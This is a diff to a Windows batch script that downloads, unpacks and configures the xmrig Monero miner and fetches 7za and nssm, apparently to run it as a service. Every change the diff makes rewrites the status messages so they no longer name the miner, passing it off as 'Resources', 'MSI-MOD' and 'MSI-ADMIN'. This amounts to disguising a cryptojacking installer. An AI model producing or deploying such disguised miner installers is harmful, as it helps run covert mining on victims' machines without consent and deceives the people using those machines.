@@ -200,10 +200,10 @@ timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
-echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
+echo [*] Downloading Resources
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download MoneroOcean advanced version of xmrig
+  echo ERROR: Can't download Required Resources
   goto MINER_BAD
 )
 
@@ -222,7 +222,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-echo [*] Checking if advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
+echo [*] Checking if advanced version of MSI-MOD Avalible
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
@@ -285,7 +285,7 @@ exit /b 1
 
 :MINER_OK
 
-echo [*] Miner "%USERPROFILE%\moneroocean\xmrig.exe" is OK
+echo [*] MSI-ADMIN is OK
 
 for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
 if [%PASS%] == [] (
@@ -363,10 +363,10 @@ if errorlevel 1 (
     echo ERROR: Can't download 7za.exe
     exit /b 1
   )
-  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+  echo [*] Unpacking...
   "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\nssm.zip" >NUL
   if errorlevel 1 (
-    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+    echo ERROR: Can't unpack required tools
     exit /b 1
   )
   del "%USERPROFILE%\7za.exe"
